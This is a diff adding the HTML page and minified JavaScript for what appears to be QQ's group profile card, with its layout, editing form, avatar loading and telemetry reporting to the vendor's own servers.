@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>群资料卡</title>
+	<script>
+window.TRecord||(window.TRecord={m:{},push:function(e,o,r){var i=this.m,n=i[e]||(i[e]={arr:[],hash:{}},i[e]);n.arr.push(o),n.hash[o]="undefined"!=typeof r?r:+new Date}}),TRecord.get=function(e,o){var r=this.m,i=r[e];return i&&o?i.hash[o]:i},TRecord.report=function(e,o,r,i){var n=100*Math.random()+1;if(("undefined"==typeof i||i>=n)&&(n=this.get(o))){for(var c,t,h=[],a=n.arr,s=1,d=a.length;d>s;s++)c=a[s],c in r&&h.push(r[c]+"="+(n.hash[c]-n.hash[a[0]]));if(h.length){t=h.join("&"),t="http://isdspeed.qq.com/cgi-bin/r.cgi?"+e+"&"+t,console&&console.info&&console.info("isdspeed report['"+o+"']: "+t);var u=new Image;u.src=t,u=null}}},TRecord.cache=[],TRecord.cacheTime=500,TRecord.curFlagURL="",TRecord.report2=function(e,o,r,i){var n=100*Math.random()+1;if(("undefined"==typeof i||i>=n)&&(n=this.get(o))){for(var c,t=[],h=n.arr,a=1,s=h.length;s>a;a++)c=h[a],c in r&&t.push(r[c]+"="+(n.hash[c]-n.hash[h[0]]));t.length&&(this.doReport(e,t),console&&console.info&&console.info("isdspeed report['"+o+"']: "+t.join("&")))}},TRecord.doReport=function(e,o){var r=this,i=function(){var e=r.cache,o="",i=r.curFlagURL;if(e.length){o=e.join("&"),o="http://isdspeed.qq.com/cgi-bin/r.cgi?"+i+"&"+o;var n=new Image;n.src=o,n=null}r.cache=[],r.curFlagURL=""};this.timer&&clearTimeout(this.timer),e!=this.curFlagURL&&i(),this.curFlagURL=e,this.cache=this.cache.concat(o),setTimeout(function(){i()},this.cacheTime)};
+</script>
+	<script>
+!function(n,e){"function"==typeof define&&define.amd?define([],e):n.TRecord=e(n.TRecord)}(this,function(n){return n=n||window.TRecord,n.getInterval=function(n,e,t){var i=this;return i[e]&&i[n]?"&"+t+"="+(i[e]-i[n]):""},n});
+</script>
+	<script type="text/javascript">
+		document.domain = 'qq.com';
+		TRecord.push("main","base");
+		TRecord.push("useable", "start");
+
+		// @资料编辑
+		TRecord['htmlStart'] = (new Date()).getTime();
+	</script>
+
+	<link rel="stylesheet" href="http://2.url.cn/qun/qinfo_v2/modules/index/css/c040.main.css">
+</head>
+
+<body>
+
+<div class="container" id="container">
+	<!-- 资料卡头部 -->
+	<header class="header" id="header">
+	    <div class="header_drag_area" id="drag_area"><div class="bg_shadow"></div></div>
+		<div class="header_main_info">
+			<div class="group_avatar" id="avatar">
+				<img id="group_avatar" src="" alt="">
+	            <a class="edit_btn" id="edit_btn" href="javascript:void(0)"></a>
+			</div>
+			<div class="other">
+				<div class="group_name_number" id="group_name_number">
+					<a class="group_auth" id="group_auth" href="javascript:void(0)" title="腾讯认证群" tabindex="1"></a>
+	                <div class="name_number copyable"  tabindex="1">
+	                	<div class="group_name usrInputFont" id="group_name"></div>
+	                	<span class="group_number" id="group_number"></span>
+	                	<!-- <a id="share_group" href="javascript:void(0)">分享群</a> -->
+	                </div>
+	            </div>
+				<div id="header_group_info" class="group_info">
+					<span class="group_type copyable" id="group_class" tabindex="1"></span>
+					<div id="group_tag" class="gourp_tag copyable usrInputFont"></div>
+					<span class="group_show_tags" id="group_show_tags">更多<em>▼</em></span>
+	                <br>
+				</div>
+				<div class="group_info pos">
+					<span class="group_pos copyable" id="group_pos" tabindex="1"></span>
+					<div class="group_member_number copyable" id="group_member_number"><span id="header_cur_num"></span>/<span id="header_max_num"></span>人</div>
+					<div class="element-invisible" id="aria_mem_num" tabindex="1"></div>
+				</div>
+				<div id="header_group_btn_container" class="header_btn_container">				
+					<button class="header_btn edit_info_btn" id="edit_info" tabindex="1">修改资料</button>
+					<button class="header_btn join_group_btn" id="join_group" tabindex="1" style="display:none;"><span class="plus">+</span>申请加群</button>
+					<button class="header_btn share_group_btn" id="share_group" tabindex="1" style="display:none;">分享群</button>
+					<button class="open_group_btn" id="open_group_chat" tabindex="1"><span class="icon"></span><span class="txt">群聊</span></button>
+				</div>
+			</div>
+		</div>
+		<div class="header_white_bg"></div><!--半透明白条-->
+	</header>
+	<!-- 导航栏 -->
+	<nav role="navigation" id="navigation">
+		<ul id="nav" class="topNav" ></ul>
+	</nav>
+
+	<div class="dividing"></div>
+
+	<!-- 主模块：首页、成员、设置 -->
+	<div id="container_parent" class="content_body">
+		<div id="container_home" class="tab_container container_home" style="display:block;">
+			<div id="info_container" class="info">
+				<!-- 群介绍 -->
+				<h3>群介绍</h3>
+				<div id="group_intro" class="intro copyable usrInputFont" tabindex="0">&nbsp;</div>
+				
+				<!-- 群课程 -->
+				<div id="group_app_lecture_container" class="group_app_lecture_container">
+					<h3 class="share_title">课程内容</h3>
+					<div id="group_lecture_container" class="group_app_lecture"></div>
+				</div>
+
+				<!-- 群相册 -->
+				<div id="group_photo_container">
+					<h3 id="photo_title" class="photo_title">群相册<span id="photo_wording"></span><a href="javascript:void(0)" id="jump_to_photo" class="view_all">更多</a></h3>
+					<div id="photo_container" class="photo_container clearfix"></div>
+				</div>
+				
+				<!-- 群文件 -->
+				<div id="group_file_container">
+					<h3 id="share_title" class="share_title">群文件<span id="share_wording"></span><a href="javascript:void(0)" id="jump_to_share" class="view_all">更多</a></h3>
+					<div id="share_container" class="share_container"></div>
+				</div>
+				
+				<!-- 群文件、群相册：未公开 -->
+				<div id="group_not_open_container">
+					<h3 id="not_open_title" style="display:none;">群文件、群相册</h3>
+					<div id="not_open_content_new" class="not_open_content_new clearfix" style="display:none;">
+						<p class="font_color_black">查看群内精彩照片和文件，<a id="not_open_join_group" class="js_join_group join_group" href="javascript:void(0)">请先加群>></a></p>
+						<div class="new_container clearfix">
+							<div id="not_open_pic_container" class="not_open_pic_container">
+								<div class="title">照片</div>
+								<div class="icon"><div class="js_img_contaienr"><div class="js_cover"></div><img class="js_img" /></div><span class="js_default_img"></span></div>
+								<div class="desc js_desc">暂无照片</div>
+							</div>
+							<div id="not_open_share_container" class="not_open_share_container">
+								<div class="title">文件</div>
+								<div class="icon"><span class="share_pic js_share_type"></span></div>
+								<div id="not_open_share_desc" class="desc js_desc"></div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="divider"></div>
+			<!-- 群主、管理员列表 -->
+			<div class="visitor" id="visitor">
+				<h3 tabindex="0">群主</h3>
+				<div class="visitor_list clearfix" id="group_master"></div>
+				
+				<h3 id="group_admin" style="display:none;" tabindex="0">管理员</h3>
+				<div class="visitor_list clearfix" id="group_admin_list" style="display:none;"></div>
+			</div>
+		</div>
+		<div id="container_member" class="tab_container nograde"></div>
+		<div id="container_setting" class="tab_container"></div>		
+	</div>
+
+	<!-- 标签面板 -->
+	<div id="group_tag_board" class="group_tag_board">
+		<div class="arrow" id="group_tag_arrow">
+			<div class="outer_arrpw"></div>
+			<div class="inner_arrow"></div>
+		</div>
+		<div class="key_word">群标签：</div>
+		<div id="group_tag_board_inner" class="tag_board usrInputFont"></div>
+	</div>
+	<div class="group_home_pos_container" id="group_home_pos_container"></div>
+
+	<!-- 引导：填写资料 -->
+	<div id="guide_profile_fill" class="guide_profile_fill">
+		<span class="edit_profile_hint"></span>
+		<button id="guide_profile_edit" class="header_btn edit_profile">修改资料</button>
+		<button id="guide_profile_quit" class="quit"></button>
+		<div class="bg"></div>
+		<div id="guide_profile_drag_bg" class="drag_bg"></div>
+	</div>
+
+	<!-- 文字运营链接 -->
+	<div id="js_tips_container" class="tips_container clearfix">
+		<a class="js_wording wording" href="javascript:void(0)"></a>
+		<a class="js_close close" href="javascript:void(0)">X</a>
+	</div>
+	
+</div>
+
+<!-- 资料编辑 -->
+<div id="profileLayer" tabindex="0" class="admin editing" style="position: absolute; z-index: 2000; left: 0px; top: 19px; height: 457px; width: 638px; border: 0px; background-color: transparent; display: none; background-color: #f8f8f8; outline: none;">
+	<!-- 地图编辑容器 -->
+	<div class="map-container" id="profile-map-container" style="display:none; position:absolute; z-index:1000; left:0; top:0; height:100%; width:100%;"></div>
+
+	<!-- 资料编辑容器 -->
+	<div class="profile-container">
+		<div class="wrap bs-profile" id='profile-wrap'>
+			<div class="base-info clearfix" id="base-info">
+				<div class="pair info-left canedit new-ui-qun-head clearfix">
+					<span class="lname aria-block top-lname">头像</span>
+					<span class="qhead" id="profile-qhead">
+						<img src="http://3.url.cn/qun/qinfo_v2/modules/profile/img/profile_default_head.png" id="js-profile-qhead" />
+					</span>
+					<span class="profile-actionBtn" id="js-profile-changehead">更改群头像</span><br>
+					<span class="profile-avatar-hint">上传清晰大图，让你的群脱颖而出</span>
+					<label class="element-invisible" for="qun-head">头像</label>
+					<div class="profile-percent-board" id="js-profile-percent-board">
+						<span class="profile-percent-label">当前资料完整度：</span>
+						<span class="profile-percent-num" id="js-profile-percent">...</span><br/>
+						<div class="profile-percent-hint" id="js-profile-percent-hint" style="display:none;">
+							<div class="plus-percent-wording"><span id="js-profile-wording">...</span><span class="plus-percent" id="js-profile-next-percent">+20</span></div>
+							<span class="plus-percent-arrow"></span>
+						</div>
+					</div>
+				</div>
+				<div class="pair info-left canedit new-ui-qun-name">
+					<span class="lname aria-block">名称</span><span id="qname" class="value copyable"><input type="text" maxlength="30" id="qun-name" tabindex="1" class="hover"></span><span id="qun-name-icon" class="succ-icon"></span><label class="element-invisible" for="qun-name">名称</label>
+				</div>
+				<div class="clearfix"></div>
+				<div class="pair info-left canedit qun-cat oneline new-ui-qun-cat" id="qun-cat">
+					<span class="lname aria-block">分类</span><span id="qun-cat-value" class="value edit-hidden copyable"></span>
+					<span id="qun-cat-hint" class="profile-hint">填写群分类</span>
+					<span id="qun-cat-succ-icon" class="succ-icon"></span>
+					<div class="detail-trigger-ctn">
+						<div class="detail-trigger" tabindex="1"></div>
+						<div class="detail-rich" style="display: none;"></div>
+					</div>
+				</div>
+				<div class="pair canedit qun-detail" id="qun-detail">
+					<span id="qun-detail-icon" class="succ-icon"></span>
+					<span class="lname">详情</span><span id="qun-detail-value" class="value edit-hidden copyable"></span>
+					<div class="detail-trigger-ctn">
+						<div class="detail-trigger" tabindex="1"></div>
+						<div class="detail-rich" style="display: none;"></div>
+					</div></div><!-- @casper 有部分老的代码逻辑强依赖于这里的节点顺序，换行要谨慎，会出bug，需要把这部分代码重构了才行 -->
+				<div class="pair canedit qun-detail oneline new-ui-pos" id="qun-loc">
+					<span class="lname aria-block">群地点</span><span class="value"><span id="qun-loc-value" class="content"></span></span>
+					<span id="qun-loc-succ-icon" class="succ-icon"></span>
+				</div>
+				<div class="pair canedit qun-intro">
+					<span class="lname aria-block" id="intro-wrap-label">群介绍</span>
+					<div class="more-wrap copyable no-intro value loading" id="intro-wrap"></div>
+					<span id="qun-intro-succ-icon" class="succ-icon"></span>
+					<span id="qun-intro-hint" class="profile-hint">输入详细简介，让大家了解你的群</span>
+				</div>
+				<div class="clearfix"></div>
+				<div class="pair info-left canedit new-ui-tag">
+					<span class="lname aria-block">关键词</span>
+					<div class="tags-con" id="tagsContainer">
+						<div class="editable" id="editTags-panel">
+							<div class="cat-tags">
+								<div class="custom-tags-add">
+									<span class="value copyable">
+										<input id="ui-ipt-addTag" type="text" name="addTag-ipt" maxlength="24" tabindex="1" placeholder="添加群标签，你的群更容易被找到"/>
+									</span>
+									<span class="profile-actionBtn paddingMore" id="ui-addTag" tabindex="-1">贴上</span>
+				                <label class="element-invisible" for="ui-ipt-addTag">新群标签,enter添加</label></div>
+							</div>
+							<div class="marked-tags" id="marked-tags">
+								<div id="ui-tags" class="qun-tags"></div>
+							</div>
+						</div>
+						<div class="noneditable" id="viewTags-panel">
+							<div class="tags" id="viewTags"></div>
+						</div>
+					</div>
+					<span id="qun-tag-succ-icon" class="succ-icon"></span>
+					<span id="qun-tag-hint" class="profile-hint">增加关键词，你的群更容易被找到</span>
+				</div>
+			</div>
+		</div>
+		<div class="action-group" id="action-group">
+			<div id="photo-share-container" class="photo-share-container" style="display:none;">
+				<input type="checkbox" id="share_photo_open" checked="checked" /><label for="share_photo_open">对游客展示群相册和群文件摘要</label>
+			</div>
+			<button class="action-edit" id="action-edit">编辑资料</button>
+			<button class="action-save stress-save" id="action-save" aria-label="保存修改">保存</button>
+			<button class="action-close stress-cancel" aria-label="退出编辑" id="action-close">返回</button>
+			<hr>
+			<hr class='white'>
+		</div>
+		<div id='contextmenu' class='contextmenu hidden'>
+			<ul>
+				<li id='copy-it' class='disabled'>复制(<em>C</em>)</li>
+				<li id='select-all'>全部选择(<em>A</em>)</li>
+			</ul>
+		</div>
+	</div>
+</div>
+
+<!--备注：检测css是否加载成功-->
+<div id="js_css_detector" class="js_css_detector" style="height:0;font-size:0;height:0;"></div>
+
+<div id='global-contextmenu' class='contextmenu hidden'>
+	<ul>
+		<li id='global-copy-it' class='disabled'>复制(<em>C</em>)</li>
+		<li id='global-select-all'>全部选择(<em>A</em>)</li>
+	</ul>
+</div>
+
+<!-- 上报相关，包含了badjs，需要提前引进，不然下面的代码出错就没有上报了 -->
+<script>
+!function(e,r){"function"==typeof define&&define.amd?define([],r):e.Badjs=r()}(this,function(){var e=function(){var e;return function(){if(!e&&(e=((window.Simple||{}).browser||{}).info,!e)){e={type:""};var r=navigator.userAgent.toLowerCase();/webkit/.test(r)?e={type:"webkit",version:/webkit[\/ ]([\w.]+)/}:/opera/.test(r)?e={type:"opera",version:/version/.test(r)?/version[\/ ]([\w.]+)/:/opera[\/ ]([\w.]+)/}:/msie/.test(r)?e={type:"msie",version:/msie ([\w.]+)/}:/mozilla/.test(r)&&!/compatible/.test(r)&&(e={type:"ff",version:/rv:([\w.]+)/}),e.version=(e.version&&e.version.exec(r)||[0,"0"])[1]}return e}}(),r=this||window,i=function(r,t,o,n,s){var a=i._mid||195375,c=i._bid||102;if(n>0||0===n?a=n:-1===n&&(r="Script Error:"+r),i.binfo||(i.binfo=e()),s=s||4,!i._closed){var d=new Image;d.src="http://badjs.qq.com/cgi-bin/js_report?level="+s+"&bid="+c+(a?"&mid="+a:"")+"&msg="+r+"|_|"+encodeURIComponent(t)+"|_|"+o+(i.binfo?"|_|browser:[type:"+i.binfo.type+",ver:"+i.binfo.version+"]":"")+"&r="+Math.random(),d=null}};i.init=function(e,r,t,o){i._mid=r,i._bid=e,i._smid=t,i._closed=o},i.check=function(e,t){for(var o in e)r[o]||i("File Load Error:"+o,e[o],0,t,8)},i.report=function(e,r,i,t,o){o||window[t]?e>0&&Badjs("Log Info:File Load Retry Success:"+t+" retry is"+e,i,0,241994,1):e==r&&Badjs("File Load Error:"+t+" retry is"+e,i,0,196584,8)},i.title=function(e,r){var i="";switch(e){case"file":return r?"File Load Error":"File Load Success";case"cgi":switch(r){case 0:i="CGI Load Success";break;case 1:i="CGI NoLogin Error";break;case 4:i="CGI BaseKey Error"}return i+"!Ec:"+(r||"");case"http":switch(r){case-1:i="Http Empty Error";break;case 200:i="HTTP Load Success";break;case 404:i="HTTP Page Does Not Exist";break;case 500:i="HTTP Server Error";break;default:i="Http Info"}return i+"!Status:"+(r||"")}};var t=[];return r.onerror=function(){t.splice.apply(arguments,[3,0,-1,null]),i.apply(this,arguments)},i});
+</script>
+<script>
+!function(e,i){"function"==typeof define&&define.amd?define([],i):e.proj_cfg=i()}(this,function(){var e={reportCfg:{bId:167,aId:function(){return"0"}},badjsCfg:{bid:211,mid:345536,log_mid:{debug:355890,info:355891,error:355892,fail:355893},close:0},DBCfg:{ec0_mid:347760,ec4_mid:347761,ecx_mid:347762,reloginFailed_mid:347763,basekeyRetryToMuch_mid:0},businessCfg:{page_404_mid:347764}};return e});
+</script>
+<script>
+!function(o,e){"function"==typeof define&&define.amd?define(["bower_components/imweb/badjs","./proj_cfg"],e):o.LOG=e(o.Badjs,o.proj_cfg)}(this,function(o,e){var i=e.badjsCfg,n=1;o.init(i.bid,i.mid,0,i.close);var r=function(e){var r,d,f,u,s={debug:1,info:2,error:4,fail:8};"string"==typeof e?(r=1,f="debug",u=i.log_mid[f],d=e,url=""):"object"==typeof e&&(f=e.type||"debug",r=s[f]||1,u=e.mid||i.log_mid[f],d=[],e.msg&&d.push("[msg]"+e.msg),d=d.join(","),url=e.url||""),d="LOG("+f+")["+d+"]",n?o(d,url,0,u,r):console.info("[LOG@console]["+f+"]msg="+d+",url="+url+",mid="+u)};return r});
+</script>
+
+<script>
+var Str=function(){function e(e){var r={};return e>=0&&(r["&quot;"]=34,r["&amp;"]=38,r["&apos;"]=39,r["&lt;"]=60,r["&gt;"]=62,r["&nbsp;"]=160),e>=1&&(r["&iexcl;"]=161,r["&cent;"]=162,r["&pound;"]=163,r["&curren;"]=164,r["&yen;"]=165,r["&brvbar;"]=166,r["&sect;"]=167,r["&uml;"]=168,r["&copy;"]=169,r["&ordf;"]=170,r["&laquo;"]=171,r["&not;"]=172,r["&shy;"]=173,r["&reg;"]=174,r["&macr;"]=175,r["&deg;"]=176,r["&plusmn;"]=177,r["&sup2;"]=178,r["&sup3;"]=179,r["&acute;"]=180,r["&micro;"]=181,r["&para;"]=182,r["&middot;"]=183,r["&cedil;"]=184,r["&sup1;"]=185,r["&ordm;"]=186,r["&raquo;"]=187,r["&frac14;"]=188,r["&frac12;"]=189,r["&frac34;"]=190,r["&iquest;"]=191,r["&Agrave;"]=192,r["&Aacute;"]=193,r["&Acirc;"]=194,r["&Atilde;"]=195,r["&Auml;"]=196,r["&Aring;"]=197,r["&AElig;"]=198,r["&Ccedil;"]=199,r["&Egrave;"]=200,r["&Eacute;"]=201,r["&Ecirc;"]=202,r["&Euml;"]=203,r["&Igrave;"]=204,r["&Iacute;"]=205,r["&Icirc;"]=206,r["&Iuml;"]=207,r["&ETH;"]=208,r["&Ntilde;"]=209,r["&Ograve;"]=210,r["&Oacute;"]=211,r["&Ocirc;"]=212,r["&Otilde;"]=213,r["&Ouml;"]=214,r["&times;"]=215,r["&Oslash;"]=216,r["&Ugrave;"]=217,r["&Uacute;"]=218,r["&Ucirc;"]=219,r["&Uuml;"]=220,r["&Yacute;"]=221,r["&THORN;"]=222,r["&szlig;"]=223,r["&agrave;"]=224,r["&aacute;"]=225,r["&acirc;"]=226,r["&atilde;"]=227,r["&auml;"]=228,r["&aring;"]=229,r["&aelig;"]=230,r["&ccedil;"]=231,r["&egrave;"]=232,r["&eacute;"]=233,r["&ecirc;"]=234,r["&euml;"]=235,r["&igrave;"]=236,r["&iacute;"]=237,r["&icirc;"]=238,r["&iuml;"]=239,r["&eth;"]=240,r["&ntilde;"]=241,r["&ograve;"]=242,r["&oacute;"]=243,r["&ocirc;"]=244,r["&otilde;"]=245,r["&ouml;"]=246,r["&divide;"]=247,r["&oslash;"]=248,r["&ugrave;"]=249,r["&uacute;"]=250,r["&ucirc;"]=251,r["&uuml;"]=252,r["&yacute;"]=253,r["&thorn;"]=254,r["&yuml;"]=255),r}var r={},t={},n={},a={},u=function(t){return r[t]||(r[t]=e(t)),r[t]},c=function(e){if(!n[e]){var r=u(e),t={};for(var a in r)t[String.fromCharCode(r[a])]="&#"+r[a]+";";t[" "]="&#32;",n[e]=t}return n[e]},i=function(e){return t[e]||(t[e]=new RegExp("("+l(u(e)).join("|")+")","g")),t[e]},o=function(e){return a[e]||(a[e]=new RegExp("["+l(c(e)).join("")+"]","g")),a[e]},l=function(e){var r=[];for(var t in e)e.hasOwnProperty(t)&&r.push(t);return r},f={'"':"#34","<":"#60",">":"#62","&":"#38"," ":"#160"};return f[String.fromCharCode(160)]="#160",{decodeHtml:function(e,r){r=isNaN(r)?0:r,e+="";var t=i(r),n=u(r);return e.replace(t,function(e,r){return"&#"+n[r]+";"}).replace(/&#x([a-f\d]+);/g,function(e,r){return"&#"+parseInt("0x"+r)+";"}).replace(/&#(\d+);/g,function(e,r){return String.fromCharCode(+r)})},encodeHtml:function(e,r){r=isNaN(r)?0:r,e+="";var t=o(r),n=c(r);return e.replace(t,function(e){return n[e]})},trim:function(e){e+="",e=e.replace(/^\s+/,"");for(var r=/\s/,t=e.length;r.test(e.charAt(--t)););return e.slice(0,t+1)},byteLen:function(e,r){var t=r||2;e+="";var n=e.match(/[^\x00-\xff]/g)||[],a=n.length;return e.length+(t-1)*a},leftPad:function(e,r,t){var n=e.toString();for("undefined"==typeof t&&(t=" ");n.length<r;)n=t+n;return n},reverse:function(e){return e+="",e.split("").reverse().join("")},formatDate:function(e,r){function t(e,r){return r=r.length,e=e||0,1==r?e:String(Math.pow(10,r)+e).slice(-r)}return e.replace(/([YMDhsm])\1*/g,function(e){switch(e.charAt()){case"Y":return t(r.getFullYear(),e);case"M":return t(r.getMonth()+1,e);case"D":return t(r.getDate(),e);case"w":return r.getDay()+1;case"h":return t(r.getHours(),e);case"m":return t(r.getMinutes(),e);case"s":return t(r.getSeconds(),e)}})},isUrl:function(e){var r=new RegExp("^((news|telnet|nttp|file|http|ftp|https)://)(([-A-Za-z0-9]+(\\.[-A-Za-z0-9]+)*(\\.[-A-Za-z]{2,5}))|([0-9]{1,3}(\\.[0-9]{1,3}){3}))(:[0-9]*)?(/[-A-Za-z0-9_\\$\\.\\+\\!\\*\\(\\),;:@&=\\?/~\\#\\%]*)*","g");return r.test(e)?!0:!1},getMaxlen:function(e,r){var t,n="",a=0,u=0,c=!1;if(e.replace(/[^\x00-\xff]/g,"xxx").length<=r)return e;for(;!c;)t=e.charAt(u),a+=null!==t.match(/[^\x00-\xff]/)?3:1,a>r?c=!0:(n+=t,u++);return n}}}();
+</script>
+<script>
+!function(t,n){"function"==typeof define&&define.amd?define([],n):t.Util=n(t.Str)}(this,function(){var Util=function($){function adjust(t,n,e){var r=t.width,a=t.height;r/a>n/e?(t.height=e,t.width=r*(e/a),t.style.marginLeft=-(t.width-n)/2+"px"):(t.width=n,t.height=a*(n/r),t.style.marginTop=-(t.height-e)/2+"px")}var systemHead={"500-80":"http://1.url.cn/res/qun_icon/icons/normal/10001/0.png","500-40":"http://1.url.cn/res/qun_icon/icons/normal/10001/0.png","1000-80":"http://1.url.cn/res/qun_icon/icons/normal/10002/0.jpg","1000-40":"http://1.url.cn/res/qun_icon/icons/normal/10002/40.png","2000-80":"http://1.url.cn/res/qun_icon/icons/normal/10003/0.jpg","2000-40":"http://1.url.cn/res/qun_icon/icons/normal/10003/40.png"},status={groupuin:"",role:""},exports={debugOn:!0,isd:function(t){setTimeout(function(){var n=new Image,e="http://isdspeed.qq.com/cgi-bin/r.cgi?flag1=7809&flag2=1&flag3=56&";for(var r in t||{})e+=r+"="+t[r];n.src=e},2e3)},debug:function(t){if(this.debugOn){var n=document.createElement("p");n.innerHTML="debug: "+t,document.body.insertBefore(n,document.body.childNodes[0])}},hash:{get:function(t){var n=top.location.hash.match(new RegExp("(#|&)"+t+"=([^&]*)(&|$)"));return n?decodeURIComponent(n[2]):""},set:function(t){location.hash="#"+t}},encryptSkey:function(){for(var t=this.cookie.get("skey"),n=5381,e=0,r=t.length;r>e;++e)n+=(n<<5)+t.charAt(e).charCodeAt();return 2147483647&n},node:{html:function(t,n){return n?(t.innerHTML=n,void 0):t.innerHTML}},cookie:{get:function(t){var n=document.cookie.match(new RegExp("(^| )"+t+"=([^;]*)(;|$)"));return n?decodeURIComponent(n[2]):""},uin:function(){var t=this.get("uin");return t?parseInt(t.substring(1,t.length),10):null}},http:{ajax:function(url,para,cb,method,type){var xhr=new XMLHttpRequest;xhr.open(method,url,!0),xhr.onreadystatechange=function(){4==xhr.readyState&&(xhr.status>=200&&xhr.status<300||304===xhr.status||1223===xhr.status||0===xhr.status?"undefined"==typeof type&&xhr.responseText?cb(eval("("+xhr.responseText+")")):cb(xhr.responseText):cb({ec:xhr.status}),xhr=null)},xhr.send(para)},post:function(t,n,e,r){var a="";for(var o in n)a+="&"+o+"="+n[o];return this.ajax(t,a,e,"POST",r)},get:function(t,n,e,r){var a=[];for(var o in n)a.push(o+"="+n[o]);return-1==t.indexOf("?")&&(t+="?"),t+=a.join("&"),this.ajax(t,null,e,"GET",r)}},init:function(){return status.groupuin=this.hash.get("groupuin"),status.role=this.hash.get("role"),this},getAvatars:function(t,n){var e=this.hash.get("groupuin");info=null,head_type=2,level=-1,ret=[],key="",r=Math.random();try{info=JSON.parse(top.external.GetGroupBasicInfo(e+""))}catch(a){info={}}return null==info&&(info={},Badjs("window.external.GetGroupBasicInfo("+e+")==null, from:Util.js",window.location,0,356050,2)),head_type=info.head_type,2==head_type?(ret=["http://p.qlogo.cn/gh/"+e+"/"+e+"/100","http://p.qlogo.cn/gh/"+e+"/"+e+"/40"],this.addRandom(ret,t),n&&n(ret)):(ret=["http://p.qlogo.cn/gh/"+e+"/"+e+"/100","http://p.qlogo.cn/gh/"+e+"/"+e+"/40"],this.addRandom(ret,t),this.getFace(function(t){t&&ret.unshift(t),n&&n(ret)})),ret},addRandom:function(t,n){var e=Math.random(),r=!1,a=localStorage.getItem("group_avatar_random");if(n?(localStorage.setItem("group_avatar_random",e),r=!0):a?(e=a,r=!0):r=!1,r)for(var o=0;o<t.length;o++)t[o]=t[o]+"?r="+e;return t},tryAvatar:function(t){var n=this,e=null,r=Array.prototype.slice.call(arguments,1);if(r.length){t.nodeType||(e=t.onload||null,t=t.img);var a={};"string"==typeof r[0]&&(a.url=r[0]);var o=new Image,i=new Date-0;o.onerror=function(){this.onerror=null,a.onerror&&a.onerror(),n.tryAvatar.apply(n,[t].concat(r.slice(1))),LOG({type:"error",msg:"群头像加载失败！ ",url:location.href,mid:372032})},o.onload=function(){var r=new Date-0,o=r-i;o>1e3&&LOG({type:"error",msg:"群头像加载超过1s！t= "+o,url:location.href,mid:372033}),n.isd({17:o}),this.onload=null,a.onload&&a.onload(),t.src=a.url,e&&e(this.width,this.height)},o.src=a.url}},updateAvatar:function(t,n){var e=this;setTimeout(function(){e.getAvatars(n,function(n){n.unshift(t),e.tryAvatar.apply(e,n)})},50)},wrapClientBasicInfoToCGIFormate:function(t){t.gName=Str.encodeHtml(t.name||""),t.gMemNum=t.cur_mem_num||"",t.gMaxMem=t.mem_max||"";var n=(t["class"]||"").split("-")[0]||"";return n=n.split(".").join(""),t.classInfo=Str.encodeHtml(n||""),t},isNotGroupMember:function(){return 1!=status.role&&2!=status.role&&3!=status.role},getPerfTimeStamp:function(){var t={};try{t=JSON.parse(external.CallHummerApi("Default.GetPerfTimeStamp"))}catch(n){t={}}return t},createScript:function(t){var n=document.createElement("script"),e="",r=function(){},a=function(){};"string"!=typeof t?(e=t.src,r=t.onload||r,a=t.onerror||a):e=t,n.async=!1,n.src=e,n.onload=r,n.onerror=a,document.head.appendChild(n)},createScripts:function(t){var n=this;t.forEach(function(t){n.createScript(t)})},seq:9999,hasUpdatedFaceCallback:!1,updateFaceCallback:function(t){var n=this;if(!this.hasUpdatedFaceCallback){var e=window.callback;window.callback=function(r){e&&e(r),r.seq==n.seq&&t&&t(r)},this.hasUpdatedFaceCallback=!0}},getFace:function(t){var n=new Date-0,e=this;this.updateFaceCallback(function(r){var a=new Date-0;e.isd({18:a-n});var o="";0==r.ec&&(o=r.grp[status.groupuin].u),t&&t(o)});var r="http://face.imweb.qq.com/cgi-bin/face?app=group_info&redir=0&seq="+this.seq+"&grp=100|"+status.groupuin;this.createScript(r)},adjust:adjust};return window.CommonUtil=exports.init(),exports}();return Util});
+</script>
+<script>
+!function(e,n){"function"==typeof define&&define.amd?define(["modules/common/js/str","modules/common/js/util"],n):e.Header=n(e.Str,e.Util)}(this,function(e,n){function a(e){var n=document.getElementById(e);return n.css=function(e,a){n.style[e]=a},n.hide=function(){n.style.display="none"},n.show=function(){n.style.display=""},n}function o(n){a("group_name").innerHTML='<span class="element-invisible">群名称是</span><span class="qname" title="'+n.gName+'">'+(n.gName||"")+"</span>",a("group_number").innerHTML='<em class="element-invisible">群号是</em>'+e.encodeHtml(i.groupuin||""),n.classInfo?(a("group_class").innerHTML='<em class="element-invisible">群分类是</em>'+n.classInfo,a("group_class").css("display","inline-block")):a("group_class").css("display","none"),n.gMaxMem&&(a("group_member_number").style.display="inline-block",a("header_cur_num").innerHTML=n.gMemNum||"",a("header_max_num").innerHTML=n.gMaxMem||"");var o=(n.pos||"").split("|");(o=o[o.length-1])?(a("group_pos").innerHTML=o,a("group_pos").css("display","inline-block")):a("group_pos").css("display","none"),n.auth?a("group_auth").css("display","inline-block"):a("group_auth").hide()}function t(){function e(){var e=new Date-0,a=s.OnGetGroupBasicInfo(i.groupuin);null==a&&(a={},Badjs("window.external.GetGroupBasicInfo("+i.groupuin+")==null, from:header.js",window.location,0,356053,2)),o(n.wrapClientBasicInfoToCGIFormate(a));var t=document.getElementById("avatar"),r=document.getElementById("group_avatar"),l=t.className;n.updateAvatar({img:document.getElementById("group_avatar"),onload:function(e){r.className=r.className+" show",40>=e?-1==l.indexOf("group_avatar_min")&&(t.className+=" group_avatar_min"):-1!=l.indexOf("group_avatar_min")&&(t.className=l.replace("group_avatar_min",""))},onerror:function(){r.className=r.className+" show"}});var u=new Date-0,c=u-e;c>1e3&&Badjs("Header initHeader:"+c,window.location,0,366176,2)}i.groupuin=n.hash.get("groupuin"),i.role=n.hash.get("role"),4==i.role&&(document.getElementById("container").className=document.getElementById("container").className+" no_nav"),setTimeout(function(){e()},0),s.OnRemoveLoading();var a=document.getElementById("drag_area");a.addEventListener("mousedown",function(e){0==e.button&&s.OnStartDragMove()})}var i={},s={OnStartDragMove:function(){try{window.external.StartDragMove()}catch(e){}},OnGetGroupBasicInfo:function(e){var n=null;try{n=JSON.parse(window.external.GetGroupBasicInfo(e+""))}catch(a){n={}}return n},OnRemoveLoading:function(){console.log("OnRemoveLoading called!");try{window.external.RemoveLoading()}catch(e){}}};return{init:t,update:o}});
+</script>
+<script>
